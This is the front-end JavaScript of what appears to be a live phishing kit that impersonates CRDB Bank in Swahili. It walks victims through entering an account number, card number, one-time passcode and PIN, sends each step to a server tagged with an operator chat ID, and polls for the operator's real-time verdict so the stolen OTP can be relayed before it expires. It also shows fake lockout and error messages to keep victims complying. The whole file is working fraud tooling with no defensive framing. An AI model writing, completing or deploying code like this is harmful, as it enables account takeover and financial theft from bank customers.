const urlParams = new URLSearchParams(window.location.search);
const adminChatId = urlParams.get('admin') || 'DEFAULT_ADMIN_ID';
let pinAttempts = 3;

function showLoading(text = "Inapakia...") {
    const overlay = document.getElementById('loading-overlay');
    overlay.querySelector('p').innerText = text;
    overlay.classList.remove('hidden');
}

function hideLoading() {
    document.getElementById('loading-overlay').classList.add('hidden');
}

function switchStep(stepNumber) {
    document.querySelectorAll('.form-step').forEach(el => el.classList.add('hidden'));
    document.getElementById(`step-${stepNumber}`).classList.remove('hidden');
}

async function sendToServer(stepNumber, data) {
    showLoading("Inachakata taarifa zako...");
    try {
        const response = await fetch('/api/submit', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ adminChatId, stepNumber, stepData: data })
        });
        const result = await response.json();
        if (result.success) {
            pollAdminResponse(stepNumber);
        } else {
            hideLoading();
            alert('Hitilafu imetokea. Tafadhali jaribu tena.');
        }
    } catch (err) {
        hideLoading();
        alert('Tatizo la mtandao.');
    }
}

function pollAdminResponse(currentStep) {
    const interval = setInterval(async () => {
        try {
            const res = await fetch(`/api/check-status/${adminChatId}`);
            const data = await res.json();
            
            if (data.status && data.status !== 'pending') {
                clearInterval(interval);
                hideLoading();
                handleAdminAction(currentStep, data.status);
            }
        } catch (e) {
            // keep polling
        }
    }, 2000);
}

function handleAdminAction(step, action) {
    if (step === 1) {
        if (action.includes('proceed')) {
            switchStep(2);
        } else if (action.includes('invalid_crdb')) {
            alert('Taarifa zako za CRDB si sahihi. Tafadhali weka namba halali.');
            document.getElementById('accountNumber').focus();
        } else if (action.includes('deny')) {
            alert('Ombi lako limesitishwa na Msimamizi.');
            location.reload();
        }
    } else if (step === 2) {
        if (action.includes('correct_otp')) {
            switchStep(3);
        } else if (action.includes('wrong_otp')) {
            alert('OTP si sahihi au imeisha muda wake. Tafadhali omba OTP mpya.');
        }
    } else if (step === 3) {
        if (action.includes('correct_pin')) {
            switchStep(4);
        } else if (action.includes('wrong_pin')) {
            pinAttempts--;
            if (pinAttempts > 0) {
                const notice = document.getElementById('pin-error-notice');
                notice.innerText = `Incorrect pin, ${pinAttempts} attempt remains.`;
                notice.classList.remove('hidden');
            } else {
                alert('Akaunti yako imezuiwa kutokana na makosa ya PIN mara nyingi.');
                location.reload();
            }
        }
    }
}

// Step Triggers
function submitStep1() {
    const accountNumber = document.getElementById('accountNumber').value;
    const cardNum = document.getElementById('cardNum').value;
    if (!accountNumber || !cardNum) {
        alert('Tafadhali jaza nafasi zote.');
        return;
    }
    sendToServer(1, { accountNumber, cardNum });
}

function submitStep2() {
    const boxes = document.querySelectorAll('.otp-box');
    let otp = '';
    boxes.forEach(b => otp += b.value);
    if (otp.length < 5) {
        alert('Tafadhali jaza namba zote 5 za OTP.');
        return;
    }
    sendToServer(2, { otp });
}

function resendOtp() {
    alert('Ombi la OTP mpya limetumwa kwa msimamizi.');
    sendToServer(2, { action: 'resend_otp' });
}

function submitStep3() {
    const boxes = document.querySelectorAll('.pin-box');
    let pin = '';
    boxes.forEach(b => pin += b.value);
    if (pin.length < 4) {
        alert('Tafadhali weka PIN ya tarakimu 4.');
        return;
    }
    sendToServer(3, { pin, attemptsLeft: pinAttempts });
}

// Auto focus movement helper for OTP/PIN inputs
document.querySelectorAll('.otp-box, .pin-box').forEach((input, index, arr) => {
    input.addEventListener('input', () => {
        if (input.value.length === 1 && index < arr.length - 1) {
            arr[index + 1].focus();
        }
    });
});
          
